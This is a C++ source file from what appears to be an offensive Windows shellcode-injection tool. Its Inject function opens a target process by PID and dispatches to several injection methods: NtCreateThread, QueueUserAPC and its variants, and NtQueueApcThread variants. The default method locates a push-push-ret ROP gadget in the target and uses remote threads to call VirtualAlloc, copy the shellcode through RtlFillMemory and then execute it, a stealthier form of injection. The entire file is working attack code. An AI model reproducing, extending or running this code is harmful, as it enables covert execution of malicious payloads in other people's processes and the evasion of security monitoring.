#include "Injection.h"

static bool InjectShellcodeUsingCreateRemoteThread(
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    SIZE_T allocSize,
    DWORD allocPerm,
    bool verbose);

bool Inject(const InjectionConfig &config)
{
    // Create a modifiable copy of the shellcode bytes
    std::vector<unsigned char> shellcodeBytes;

    LoadShellcodeEx(config, shellcodeBytes);

    // Open process with necessary permissions (using function from ProcessThread.h)
    HANDLE hProcess = OpenTargetProcess(config.targetPid);
    if (!hProcess)
    {
        std::cerr << "[!] Failed to open target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "[*] Successfully opened process with PID: " << config.targetPid << std::endl;
    }

    bool success = false;

    // Choose appropriate delivery method
    switch (config.method)
    {
    case DeliveryMethod::NTCREATETHREAD:
        if (config.verbose)
        {
            std::cout << "[*] Using NtCreateThread injection method" << std::endl;
        }
        success = InjectShellcodeUsingNtCreateThread(
            hProcess,
            shellcodeBytes,
            config.allocSize,
            config.allocPerm,
            config.verbose);
        break;

    case DeliveryMethod::QUEUEUSERAPC:
        if (config.verbose)
        {
            std::cout << "[*] Using QueueUserAPC injection method" << std::endl;
        }
        success = InjectShellcodeUsingAPC(
            hProcess,
            shellcodeBytes,
            config);
        break;

    case DeliveryMethod::QUEUEUSERAPC2:
        if (config.verbose)
            std::cout << "[*] Using QueueUserAPC2 injection method with special user APC flag" << std::endl;

        success = InjectShellcodeUsingQueueUserAPC2(
            hProcess,
            shellcodeBytes,
            config);
        break;

    case DeliveryMethod::NTQUEUEAPCTHREAD:
        if (config.verbose)
            std::cout << "[*] Using NtQueueApcThread injection method" << std::endl;

        success = InjectShellcodeUsingNtQueueApcThread(
            hProcess,
            shellcodeBytes,
            config);
        break;

    case DeliveryMethod::NTQUEUEAPCTHREADEX:
        if (config.verbose)
            std::cout << "[*] Using NtQueueApcThreadEx injection method" << std::endl;

        success = InjectShellcodeUsingNtQueueApcEx(
            hProcess,
            shellcodeBytes,
            config);
        break;

    case DeliveryMethod::NTQUEUEAPCTHREADEX2:
        if (config.verbose)
            std::cout << "[*] Using NtQueueApcThreadEx2 injection method with special user APC flag" << std::endl;

        success = InjectShellcodeUsingNtQueueApcThreadEx2(
            hProcess,
            shellcodeBytes,
            config);
        break;

    case DeliveryMethod::CREATETHREAD:
    default:
        if (config.verbose)
            std::cout << "[*] Using ROP gadget injection method" << std::endl;

        success = InjectShellcodeUsingCreateRemoteThread(
            hProcess,
            shellcodeBytes,
            config.allocSize,
            config.allocPerm,
            config.verbose);
        break;
    }

    CloseHandle(hProcess);
    return success;
}

static bool InjectShellcodeUsingCreateRemoteThread(
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    SIZE_T allocSize,
    DWORD allocPerm,
    bool verbose)
{
    // Find a unique push-push-ret gadget in the target process
    GadgetInfo gadget = FindUniquePushPushRetGadget(hProcess);
    if (gadget.address == nullptr)
    {
        std::cerr << "[!] Failed to find a suitable ROP gadget in the target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (verbose)
        std::cout << "[*] Found ROP gadget at address: " << gadget.address << std::endl;

    // Get necessary function addresses
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32)
    {
        std::cerr << "[!] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pExitThread = GetProcAddress(hKernel32, "ExitThread");
    LPVOID pRtlFillMemory = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlFillMemory"); // RtlFillMemory is in ntdll.dll
    if (verbose)
    {
        std::cout << "[*] Function addresses obtained:"
                  << "\n    VirtualAlloc: " << pVirtualAlloc
                  << "\n    ExitThread: " << pExitThread
                  << "\n    RtlFillMemory: " << pRtlFillMemory << std::endl;
    }

    if (!pVirtualAlloc || !pExitThread || !pRtlFillMemory)
    {
        std::cerr << "[!] Failed to get necessary function addresses. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Set the ExitThread address for use in remote threads
    DWORD64 exitThreadAddr = reinterpret_cast<DWORD64>(pExitThread);

    // Allocate memory in the target process for the shellcode
    DWORD64 ALLOC_SIZE = allocSize;
    DWORD64 ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE;
    DWORD64 ALLOC_PROTECT = allocPerm;
    DWORD64 REQUESTED_ALLOC_ADDR = 0x60000; // Default base address for allocation

    // Create a remote thread to call VirtualAlloc
    bool allocSuccess = CreateRemoteThreadViaGadget(
        hProcess, gadget,
        REQUESTED_ALLOC_ADDR, ALLOC_SIZE, ALLOC_TYPE, ALLOC_PROTECT,
        reinterpret_cast<DWORD64>(pVirtualAlloc), exitThreadAddr);

    if (!allocSuccess)
    {
        std::cerr << "[!] Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (verbose)
        std::cout << "[*] Successfully allocated memory at address: 0x" << std::hex
                  << REQUESTED_ALLOC_ADDR << std::dec
                  << " with size: " << ALLOC_SIZE << " bytes" << std::endl;

    // Copy the shellcode to the allocated memory
    bool copySuccess = PerformRemoteMemoryCopy(
        hProcess, gadget,
        pRtlFillMemory, // Pass address of RtlFillMemory
        REQUESTED_ALLOC_ADDR,
        shellcodeBytes.data(), shellcodeBytes.size(),
        exitThreadAddr);

    if (!copySuccess)
    {
        std::cerr << "[!] Failed to copy shellcode to the target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (verbose)
        std::cout << "[*] Successfully copied " << shellcodeBytes.size()
                  << " bytes of shellcode to the target process" << std::endl;

    // Execute the shellcode
    bool execSuccess = CreateRemoteThreadViaGadget(
        hProcess, gadget,
        0, 0, 0, 0,
        REQUESTED_ALLOC_ADDR, exitThreadAddr);

    if (!execSuccess)
    {
        std::cerr << "[!] Failed to execute shellcode. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (verbose)
        std::cout << "[*] Successfully executed shellcode" << std::endl;

    return true;
}